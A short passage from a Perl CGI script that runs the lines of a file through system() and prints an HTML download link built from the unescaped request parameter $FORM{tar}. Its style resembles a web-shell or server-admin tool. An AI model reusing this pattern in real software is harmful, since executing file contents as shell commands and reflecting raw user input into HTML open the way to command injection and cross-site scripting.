@lines =<INFO> ;
close(INFO);
system(@lines);
print'<p><a href="'.$FORM{tar}.'.tar"><font color="#00FF00">
<span style="text-decoration: none">Click Here To Download Tar File</span></font></a></p>';
}
}
 print"
</body>
</html>";